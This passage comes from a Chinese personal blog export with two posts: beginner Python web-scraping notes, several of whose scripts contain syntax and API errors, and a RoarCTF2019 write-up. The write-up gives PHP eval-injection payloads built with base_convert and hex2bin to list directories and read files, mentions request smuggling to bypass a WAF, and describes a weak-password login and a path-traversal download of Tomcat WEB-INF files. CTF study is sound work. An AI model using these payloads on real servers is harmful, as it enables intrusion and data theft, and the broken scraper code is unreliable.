    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="爬虫学习"><a href="#爬虫学习" class="headerlink" title="爬虫学习"></a>爬虫学习</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
<li>向浏览器发送请求，获取响应</li>
<li>得到 <code>200回显</code> 后，需要进行<code>html解析</code><ul>
<li>创建一个新的文件来解析 <code>html(通过正则匹配</code></li>
<li>调用 <code>bs4</code> 解析我们的html （<code>html5lib</code> –可以通过浏览器的形式取解析网页）</li>
<li>需要去获取我们需要的信息，例如：图片 -&gt; <code>img 标签</code> -&gt; <code>src属性值</code></li>
<li>再通过src路径向浏览器发送请求</li>
<li>请求成功以后,将我们的图片信息以二进制的方式进行写入我们的文件中</li>
<li>实现批量爬取</li>
</ul>
</li>
</ul>
<hr>
<h2 id="实例1-批量获取图片"><a href="#实例1-批量获取图片" class="headerlink" title="实例1 批量获取图片"></a>实例1 批量获取图片</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件下载路径</span></span><br><span class="line">download = <span class="string">&quot;images/&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 爬取网站路径</span></span><br><span class="line">        url=<span class="string">&quot;http://sc.chinaz.com/tupian/index.html&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">&quot;http://sc.chinaz.com/tupian/index_%d.html&quot;</span>%i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送请求获取响应 成功状态码为200</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment">#使用bs取解析网页</span></span><br><span class="line">        bs = BeautifulSoup(response.content,<span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">        <span class="comment">#定位到网页中存放图片的DIV attrs 默认采用的是class</span></span><br><span class="line">        warp = bs.find(<span class="string">&quot;div&quot;</span>, attrs=&#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;container&quot;</span>&#125;)</span><br><span class="line">        <span class="comment"># 获取我们的img  # 音频  audio  src</span></span><br><span class="line">        imglist = warp.find_all(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">        <span class="comment"># 获取图片的名称 --debug来检查代码</span></span><br><span class="line">        <span class="keyword">for</span> img <span class="keyword">in</span> imglist:</span><br><span class="line">            title = img[<span class="string">&quot;alt&quot;</span>]</span><br><span class="line">            src = img[<span class="string">&quot;src2&quot;</span>]</span><br><span class="line">            <span class="comment">#需要再一次取请求图片地址 并且将图片放入文件夹中</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(download+title+<span class="string">&quot;.jpg),&quot;</span>w<span class="string">b&quot;)as file:</span></span><br><span class="line"><span class="string">                file.write(requests.get(src).content)</span></span><br><span class="line"><span class="string">        print(&quot;</span>第%d页打印完成<span class="string">&quot;%i)</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="实例2-单张小说"><a href="#实例2-单张小说" class="headerlink" title="实例2 单张小说"></a>实例2 单张小说</h2><p><a href="https://www.cnblogs.com/simple-li/p/11253312.html">初识python 之 爬虫：BeautifulSoup 的 find、find_all、select 方法</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">&quot;novel/&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"><span class="comment"># 发送请求获取响应</span></span><br><span class="line">url = <span class="string">&quot;https://www.biqukan.com/42_42882/14586139.html&quot;</span></span><br><span class="line">reponse = requests.get(url)</span><br><span class="line"><span class="comment"># 解析响应内容</span></span><br><span class="line"><span class="keyword">if</span> reponse.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(reponse.content,<span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取标题</span></span><br><span class="line">    <span class="comment"># bs.find()</span></span><br><span class="line">    <span class="comment"># bs.findAll()</span></span><br><span class="line">    <span class="comment"># bs.find_all(&quot;div&quot;,attrs=&#123;&quot;&quot;:&quot;&quot;&#125;)</span></span><br><span class="line">    h1 = bs.select_one(<span class="string">&quot;h1&quot;</span>)</span><br><span class="line">    title = h1.text</span><br><span class="line">    <span class="comment"># 找当前文章的文本</span></span><br><span class="line">    showtxt = bs.select_one(<span class="string">&quot;.showtxt&quot;</span>).text</span><br><span class="line">    <span class="comment"># 对文本进行操作 想去掉不需要的东西(字符串类型)---replace</span></span><br><span class="line">    res = showtxt.replace(<span class="string">&quot;app2();&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(download+title+<span class="string">&quot;.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(res)</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="实例3-整本小说"><a href="#实例3-整本小说" class="headerlink" title="实例3 整本小说"></a>实例3 整本小说</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.biqukan.com/42_42882/&quot;</span></span><br><span class="line">response = requests.get(url, header=header)</span><br><span class="line">response.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content,<span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">    title = bs.select_one(<span class="string">&quot;h2&quot;</span>).text+<span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="comment"># 在进行到我们爬取标题的时候创建以标题命名的文件夹</span></span><br><span class="line">    <span class="comment"># 文件下载路径 = &quot;xxx/&quot; </span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(title):</span><br><span class="line">        os.mkdir(title)</span><br><span class="line">    <span class="comment"># 找我们的div标签</span></span><br><span class="line">    listman = bs.select_one(<span class="string">&quot;.listmain&quot;</span>)</span><br><span class="line">    <span class="comment"># 找到所有的a标签</span></span><br><span class="line">    alist = listman.select(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alist:</span><br><span class="line">        aTitle = a.text</span><br><span class="line">        href = a[<span class="string">&quot;href&quot;</span>].split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># print(aTitle,href)</span></span><br><span class="line">        <span class="comment"># 再一次请求进入三级域名</span></span><br><span class="line">        urlChild = url+href</span><br><span class="line">        responseChild = requests.get(urlChild)</span><br><span class="line">        <span class="keyword">if</span> responseChild.status_code == <span class="number">200</span>:</span><br><span class="line">           bsChild = BeautifulSoup(responseChild.content,<span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">           <span class="comment"># 找当前文章的文本 type(showtxt) (str)</span></span><br><span class="line">           showtxt = bsChild.select_one(<span class="string">&quot;.showtxt&quot;</span>).text</span><br><span class="line">           <span class="comment"># 对文本进行操作 去掉不想要的 replace</span></span><br><span class="line">           res = showtxt.replace(<span class="string">&quot;app2();&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">           <span class="keyword">with</span> <span class="built_in">open</span>(title + aTitle + <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">               file.write(res)</span><br></pre></td></tr></table></figure></div>

<h1 id="爬虫学习2"><a href="#爬虫学习2" class="headerlink" title="爬虫学习2"></a>爬虫学习2</h1><p>自己也不知道这几天怎么过来的，反正说学到多少，也没多少，说没学，这两周每天一整个下午都在学这个。</p>
<h2 id="爬音频"><a href="#爬音频" class="headerlink" title="爬音频"></a>爬音频</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">download = <span class="string">&quot;music/&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.i4.cn/ring_22_0_1.html&quot;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    bs = BeautifulSoup(response.content, <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">    <span class="comment"># 寻找存放音乐的 div find 类似</span></span><br><span class="line">    kbox = bs.select(<span class="string">&quot;.kbox&quot;</span>)</span><br><span class="line">    <span class="comment"># 找 ring_list</span></span><br><span class="line">    ring = kbox.select(<span class="string">&quot;.ring_list&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">&quot;.title&quot;</span>).text</span><br><span class="line">        <span class="comment"># title = li.select(&quot;.title&quot;)[&quot;title&quot;]</span></span><br><span class="line">        <span class="comment"># print(title)</span></span><br><span class="line">        src = li.select(<span class="string">&quot;.audio_play&quot;</span>)[<span class="string">&quot;data-mp3&quot;</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(download + title + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            r = requests.get(src)</span><br><span class="line">            file.write(r.content)</span><br></pre></td></tr></table></figure></div>

<p>只是引用的包不同，所以存在一些写法不同</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"></span><br><span class="line">download = <span class="string">&quot;music/&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    mkdir(download)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;https://www.i4.cn/ring_22_0_1.html&quot;</span></span><br><span class="line"></span><br><span class="line">response = request.urlopen(url)</span><br><span class="line"><span class="comment"># print(response) 二进制读取</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">    <span class="comment"># 寻找存放音乐的 div find 类似</span></span><br><span class="line">    kbox = bs.select(<span class="string">&quot;.kbox&quot;</span>)</span><br><span class="line">    <span class="comment"># 找 ring_list</span></span><br><span class="line">    ring = kbox.select(<span class="string">&quot;.ring_list&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ring:</span><br><span class="line">        title = li.select(<span class="string">&quot;.title&quot;</span>).text</span><br><span class="line">      src = li.select(<span class="string">&quot;.audio_play&quot;</span>)[<span class="string">&quot;data-mp3&quot;</span>]</span><br><span class="line">        request.urlretrieve(src, download + title +<span class="string">&quot;.mp3&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="爬豆瓣的评论，帖子"><a href="#爬豆瓣的评论，帖子" class="headerlink" title="爬豆瓣的评论，帖子"></a>爬豆瓣的评论，帖子</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">download = <span class="string">&quot;comment/&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寄生虫</span></span><br><span class="line">url=<span class="string">&quot;https://movie.douban.com/subject/27010768/&quot;</span></span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(url=url, headers=header, method=<span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (req)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="comment"># print(response.read()) # 二进制读取</span></span><br><span class="line"></span><br><span class="line">bs = BeautifulSoup(response.read(), <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">    <span class="comment"># 寻找豆瓣评论的div </span></span><br><span class="line">comments = bs.select_one(<span class="string">&quot;#comments-section&quot;</span>)</span><br><span class="line">    <span class="comment"># 找 单个评论</span></span><br><span class="line">shortInfo = comments.select(<span class="string">&quot;.comment&quot;</span>)</span><br><span class="line"><span class="comment"># 创建一个list 列表 存放数据</span></span><br><span class="line">comlist = []</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> shortInfo:</span><br><span class="line">    info = li.select_one(<span class="string">&quot;.comment-info&quot;</span>)</span><br><span class="line">    <span class="comment"># 评论人</span></span><br><span class="line">    name = info.select_one(<span class="string">&quot;a&quot;</span>).text</span><br><span class="line">    <span class="comment"># 评论信息</span></span><br><span class="line">    shortcom = li.select_one(<span class="string">&quot;.short&quot;</span>).text</span><br><span class="line">    <span class="comment"># 将数据写入 csv 文件 </span></span><br><span class="line">    <span class="comment"># 将数据转为 字典</span></span><br><span class="line">    commentText = &#123;<span class="string">&quot;name&quot;</span>:name, <span class="string">&quot;comment-info&quot;</span>:shortcom&#125;</span><br><span class="line">    comlist.append(commentText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;寄生虫.csv&quot;</span>, <span class="string">&quot;w&quot;</span>, newline=<span class="string">&quot;&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    csvWr = csv.writer(file)</span><br><span class="line">    <span class="keyword">for</span> Scom <span class="keyword">in</span> comlist:</span><br><span class="line">        csvWr.writerow([Scom[<span class="string">&quot;name&quot;</span>], Scom[<span class="string">&quot;comment-info&quot;</span>]])</span><br><span class="line">        <span class="comment"># csvWr.writerows([Scom[&quot;name&quot;], Scom[&quot;comment-info&quot;]])</span></span><br><span class="line">        <span class="comment"># 多打s 会造成每个字符都变成一个单元格属性</span></span><br></pre></td></tr></table></figure></div>

<p>这边最后那里还是可以注意一下，一些细节问题，会导致最后的结果出现偏差</p>
<hr>
<h2 id="爬视频"><a href="#爬视频" class="headerlink" title="爬视频"></a>爬视频</h2><p>首先要去下载一个 <code>ffmpeg</code> ，这个东西可以把视频流源爬下来</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://jx618g.com/?url=&quot;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">bs = BeautifulSoup(response.content, <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(bs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到 src m3u8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd: ffmpeg -i m3u8地址 -vcodec copy -acodec copy xxx.mp4</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="日常瞎扯一会"><a href="#日常瞎扯一会" class="headerlink" title="日常瞎扯一会"></a>日常瞎扯一会</h1><p>难得有时间逼逼两句，本来打算找个好点的图床，毕竟一直白嫖微博好像也不太好，可是发现没几个好的，想了下，等过段时间 <code>coding</code> 那边升级结束后，再把自己的blog 搬过去一份好了，网站备案还在考虑中，实在不行以后就自己把这些全一股脑扔 <code>one note</code> 算了，反正站小，一年几百块的cdn 想了下好像也没那么必要出这个钱，等以后自己能成大佬了，站流量大了再说吧。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RoarCTF2019复现(1)</title>
    <url>/yakko117/2019/10/31/roarctf01/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="最近自己进入了懈怠期，11月还请继续加油吧"><a href="#最近自己进入了懈怠期，11月还请继续加油吧" class="headerlink" title="最近自己进入了懈怠期，11月还请继续加油吧"></a>最近自己进入了懈怠期，11月还请继续加油吧</h1><h2 id="0x01-Easy-Calc"><a href="#0x01-Easy-Calc" class="headerlink" title="0x01 Easy Calc"></a>0x01 Easy Calc</h2><p>国赛love_math 的一道变体<br>进入页面查看源码， 发现 <code>calc.php</code>页面</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu3hngj30c403m3yc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu3hngj30c403m3yc.jpg" class="lazyload"></a></p>
<p>在 <code>calc.php</code> 得到源码如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]; </span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]; </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123; </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>除去了长度限制， 但是网站加了waf，当初打的时候一直跳403<br>后来知道有个知识点，HTTP请求走私，以此来绕过waf<br><a href="https://paper.seebug.org/1048/">http请求走私</a><br><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">参考文档</a></p>
<p>尝试进行查看 <code>phpinfo()</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu548nj317d0mgaes.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu548nj317d0mgaes.jpg" class="lazyload"></a></p>
<hr>
<p>然后要构造列目录的payload，要使用<code>scandir</code>函数，尝试构造列举根目录下的文件。<br><code>scandir</code>可以用<code>base_convert函数</code>构造，但是利用<code>base_convert</code>只能解决<code>a~z</code>的利用，因为根目录需要<code>/</code>符号，且不在<code>a~z</code>，所以需要<code>hex2bin(dechex(47))</code>这种构造方式，dechex()函数把十进制数转换为十六进制数。<code>hex2bin()函数</code>把十六进制值的字符串转换为 ASCII字符。</p>
<p>上次国赛留下的base转码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;scandir&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line">得到 <span class="number">61693386291</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(<span class="string">&#x27;47&#x27;</span>))</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(<span class="string">&#x27;46&#x27;</span>))</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(<span class="string">&#x27;32&#x27;</span>))</span><br><span class="line">空格</span><br></pre></td></tr></table></figure></div>

<p>构造payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(46)).hex2bin(dechex(47))))</span><br><span class="line">相当于car_dump(scandir(./))</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu4tdfj312g0g3q5x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu4tdfj312g0g3q5x.jpg" class="lazyload"></a></p>
<p>可以看到目录，然后跟进目录， 最后在根目录得到 <code>f1agg</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu7gfej312j0jfgp1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu7gfej312j0jfgp1.jpg" class="lazyload"></a></p>
<p>构造读取flag，使用<code>readfile函数</code><br>payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</span><br></pre></td></tr></table></figure></div>
<p>得到flag<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu52l2j30zf0dqad1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmhu52l2j30zf0dqad1.jpg" class="lazyload"></a></p>
<p>看了师傅的一些其他思路，这里就看一下知识点<br><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p>
<hr>
<h2 id="0x02-Easy-java"><a href="#0x02-Easy-java" class="headerlink" title="0x02 Easy_java"></a>0x02 Easy_java</h2><p>开局一个登陆，尝试弱口令， admin&#x2F;admin888 进去了（Orz 然后没什么用）<br>得到一张图</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvkgazj30lp0l5wji.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvkgazj30lp0l5wji.jpg" class="lazyload"></a></p>
<p>行吧，看一下一开始的help，看到结构</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/Download?filename=help.docx</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvidp1j30dm01twei.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvidp1j30dm01twei.jpg" class="lazyload"></a></p>
<p>既然 <code>GET</code> 无法请求到，就要换一个请求，想起题目tips说是送分题，尝试 <code>post</code> ，然后被恶心到了<br>不过方向还是对的</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvjvitj30na09s0u0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmvjvitj30na09s0u0.jpg" class="lazyload"></a></p>
<p>报错爆出tomcat， 结合上面的包含漏洞，尝试找一下tomcat的<code>WEB-INF/web.xml</code><br>然后就发现好东西了，找到flag路径</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmviw3lj30vb0gejsy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8hmmviw3lj30vb0gejsy.jpg" class="lazyload"></a></p>
<p>最后提交payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure></div>
<p>发现一段类似base64的字符串</p>
